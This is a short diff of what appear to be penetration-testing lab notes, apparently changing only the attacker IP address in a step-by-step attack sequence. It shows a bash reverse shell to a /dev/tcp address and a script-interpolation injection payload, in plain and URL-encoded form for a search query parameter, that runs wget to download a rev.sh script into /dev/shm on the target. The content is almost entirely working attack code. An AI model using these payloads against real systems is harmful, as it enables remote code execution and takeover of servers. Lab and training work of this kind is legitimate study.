@@ -692,8 +692,8 @@ bash -i >& /dev/tcp/192.168.45.242/4445 0>&1
 
 
 2. Upload 
-${script:javascript:java.lang.Runtime.getRuntime().exec('wget 192.168.45.242/rev.sh -O /dev/shm/rev.sh')}
-/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.242%2Frev.sh%20-O%20%2Fdev%2Fshm%2Frev.sh%27%29%7D
+${script:javascript:java.lang.Runtime.getRuntime().exec('wget 192.168.45.197/rev.sh -O /dev/shm/rev.sh')}
+/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.197%2Frev.sh%20-O%20%2Fdev%2Fshm%2Frev.sh%27%29%7D
 
 
 3. Execute
